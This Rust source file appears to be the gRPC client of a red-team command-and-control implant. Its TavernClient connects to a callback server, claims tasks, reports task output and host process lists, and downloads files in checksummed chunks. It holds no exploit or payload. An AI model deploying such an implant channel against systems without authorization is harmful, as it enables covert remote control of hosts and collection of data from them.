pub mod c2_manual_client {

    use tonic::codec::ProstCodec;
    use tonic::GrpcMethod;

    static CLAIM_TASKS_PATH: &str = "/c2.C2/ClaimTasks";
    static REPORT_TASK_OUTPUT_PATH: &str = "/c2.C2/ReportTaskOutput";
    static REPORT_PROCESS_LIST_PATH: &str = "/c2.C2/ReportProcessList";
    static DOWNLOAD_FILE_PATH: &str = "/c2.C2/DownloadFile";

    #[derive(Debug, Clone)]
    pub struct TavernClient {
        grpc: tonic::client::Grpc<tonic::transport::Channel>,
    }

    impl TavernClient {
        pub async fn connect(callback: String) -> Result<Self, tonic::transport::Error> {
            let endpoint = tonic::transport::Endpoint::from_shared(callback)?;
            let channel = endpoint.connect().await?;
            let grpc = tonic::client::Grpc::new(channel);
            Ok(Self { grpc })
        }

        pub async fn claim_tasks(
            &mut self,
            request: impl tonic::IntoRequest<super::ClaimTasksRequest>,
        ) -> std::result::Result<tonic::Response<super::ClaimTasksResponse>, tonic::Status>
        {
            self.grpc.ready().await.map_err(|e| {
                tonic::Status::new(
                    tonic::Code::Unknown,
                    format!("Service was not ready: {}", e),
                )
            })?;
            let codec: ProstCodec<super::ClaimTasksRequest, super::ClaimTasksResponse> =
                tonic::codec::ProstCodec::default();

            let path = tonic::codegen::http::uri::PathAndQuery::from_static(CLAIM_TASKS_PATH);
            let mut req = request.into_request();
            req.extensions_mut()
                .insert(GrpcMethod::new("c2.C2", "ClaimTasks"));
            self.grpc.unary(req, path, codec).await
        }

        pub async fn report_task_output(
            &mut self,
            request: impl tonic::IntoRequest<super::ReportTaskOutputRequest>,
        ) -> std::result::Result<tonic::Response<super::ReportTaskOutputResponse>, tonic::Status>
        {
            self.grpc.ready().await.map_err(|e| {
                tonic::Status::new(
                    tonic::Code::Unknown,
                    format!("Service was not ready: {}", e),
                )
            })?;
            let codec: ProstCodec<super::ReportTaskOutputRequest, super::ReportTaskOutputResponse> =
                tonic::codec::ProstCodec::default();
            let path =
                tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_TASK_OUTPUT_PATH);
            let mut req = request.into_request();
            req.extensions_mut()
                .insert(GrpcMethod::new("c2.C2", "ReportTaskOutput"));
            self.grpc.unary(req, path, codec).await
        }

        ///
        /// Report the active list of running processes. This list will replace any previously reported
        /// lists for the same host.
        pub async fn report_process_list(
            &mut self,
            request: impl tonic::IntoRequest<super::ReportProcessListRequest>,
        ) -> std::result::Result<tonic::Response<super::ReportProcessListResponse>, tonic::Status>
        {
            self.grpc.ready().await.map_err(|e| {
                tonic::Status::new(
                    tonic::Code::Unknown,
                    format!("Service was not ready: {}", e),
                )
            })?;
            let codec: ProstCodec<
                super::ReportProcessListRequest,
                super::ReportProcessListResponse,
            > = tonic::codec::ProstCodec::default();
            let path =
                tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_PROCESS_LIST_PATH);
            let mut req = request.into_request();
            req.extensions_mut()
                .insert(GrpcMethod::new("c2.C2", "ReportProcessList"));
            self.grpc.unary(req, path, codec).await
        }

        ///
        /// Download a file from the server, returning one or more chunks of data.
        /// The maximum size of these chunks is determined by the server.
        /// The server should reply with two headers:
        ///   - "sha3-256-checksum": A SHA3-256 digest of the entire file contents.
        ///   - "file-size": The number of bytes contained by the file.
        ///
        /// If no associated file can be found, a NotFound status error is returned.
        pub async fn download_file(
            &mut self,
            request: impl tonic::IntoRequest<super::DownloadFileRequest>,
        ) -> std::result::Result<
            tonic::Response<tonic::codec::Streaming<super::DownloadFileResponse>>,
            tonic::Status,
        > {
            self.grpc.ready().await.map_err(|e| {
                tonic::Status::new(
                    tonic::Code::Unknown,
                    format!("Service was not ready: {}", e),
                )
            })?;
            let codec: ProstCodec<super::DownloadFileRequest, super::DownloadFileResponse> =
                tonic::codec::ProstCodec::default();
            let path = tonic::codegen::http::uri::PathAndQuery::from_static(DOWNLOAD_FILE_PATH);
            let mut req = request.into_request();
            req.extensions_mut()
                .insert(GrpcMethod::new("c2.C2", "DownloadFile"));
            self.grpc.server_streaming(req, path, codec).await
        }
    }
}
